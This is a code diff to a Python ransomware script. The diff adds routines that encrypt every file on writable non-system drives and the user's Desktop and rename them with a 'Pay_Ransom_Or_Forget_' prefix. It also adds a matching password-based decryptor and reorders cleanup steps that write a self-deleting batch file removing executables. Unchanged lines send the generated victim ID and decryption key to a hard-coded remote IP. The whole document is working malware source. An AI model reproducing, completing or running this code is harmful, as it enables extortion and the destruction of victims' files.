@@ -4,7 +4,7 @@ from Crypto.Hash import SHA256
 
 def encrypt(key, filename):
   chunksize = 64*1024
-  outputFile = "(encrypted)"+filename
+  outputFile = os.path.dirname(filename)+"/Pay_Ransom_Or_Forget_"+os.path.basename(filename)
   filesize = str(os.path.getsize(filename)).zfill(16)
   IV = ''
 
@@ -34,8 +34,7 @@ def encrypt(key, filename):
 
 def decrypt(key, filename):
   chunksize = 64*1024
-  outputFile = filename[11:]
-  
+  outputFile = os.path.dirname(filename)+"/"+os.path.basename(filename)[21:]  
   with open(filename, 'rb') as infile:
     filesize = long(infile.read(16))
     IV = infile.read(16)
@@ -58,16 +57,11 @@ def getKey(password):
   return hasher.digest()
 
 def start_encrypting():
-  shutil.copy("Setup.exe","C:/Users/"+getpass.getuser()+"/Desktop/Setup.exe")
   
   password=''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(16))
   id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(5))
   urllib.urlopen("http://139.59.8.120?id="+id+"&key="+password)
   
-  f=open("D:/check.bat","w")
-  f.write("echo 'Pay Ransom'")
-  f.close()
-
   drives=[]
   all_drives=psutil.disk_partitions()
   for drive in all_drives:
@@ -76,9 +70,51 @@ def start_encrypting():
   for drive in drives:
     for subdir, dirs, files in os.walk(drive+":/"):
         for file in files:
-            print os.path.join(subdir, file)
+            print "Encrypting "+os.path.join(subdir, file)
+            try:
+              encrypt(getKey(password),os.path.join(subdir, file))              
+            except Exception as e:
+              print e
+  for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
+      for file in files:
+          print "Encrypting "+os.path.join(subdir, file)
+          try:
+            encrypt(getKey(password),os.path.join(subdir, file))              
+          except Exception as e:
+            print e
 
+  shutil.copy("Setup.exe","C:/Users/"+getpass.getuser()+"/Desktop/Setup.exe")
+  f=open("D:/check.bat","w")
+  f.write("echo 'Pay Ransom'")
+  f.close()
 
+def start_decrypting():
+  password = raw_input("Enter password to decrypt files: ")
+  drives=[]
+  all_drives=psutil.disk_partitions()
+  for drive in all_drives:
+    if list(drive)[3]=='rw,fixed' and list(drive)[1][0] != 'C' :
+      drives.append(list(drive)[1][0])
+  for drive in drives:
+    for subdir, dirs, files in os.walk(drive+":/"):
+        for file in files:
+            print "Decrypting "+os.path.join(subdir, file)
+            if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
+              try:
+                decrypt(getKey(password),os.path.join(subdir, file))
+                os.remove(os.path.join(subdir, file))
+              except Exception as e:
+                print e
+
+  for subdir, dirs, files in os.walk("C:/Users/"+getpass.getuser()+"/Desktop/"):
+      for file in files:
+          print "Decrypting "+os.path.join(subdir, file)
+          if "Pay_Ransom_Or_Forget_" in os.path.join(subdir, file):
+            try:
+              decrypt(getKey(password),os.path.join(subdir, file))
+              os.remove(os.path.join(subdir, file))              
+            except Exception as e:
+              print e
 
 
 if __name__ == '__main__':
@@ -88,11 +124,10 @@ if __name__ == '__main__':
   else:
     start_encrypting()
     print "Encrypting.."
-  s=raw_input()
-  with open("del.bat", "w") as delfile:
-    delfile.write("@echo off\n")
-    delfile.write('del *.exe\n')
-    delfile.write('del del.bat')
-  os.startfile("del.bat") 
+    with open("del.bat", "w") as delfile:
+      delfile.write("@echo off\n")
+      delfile.write('del *.exe\n')
+      delfile.write('del del.bat')
+    os.startfile("del.bat") 
 
 
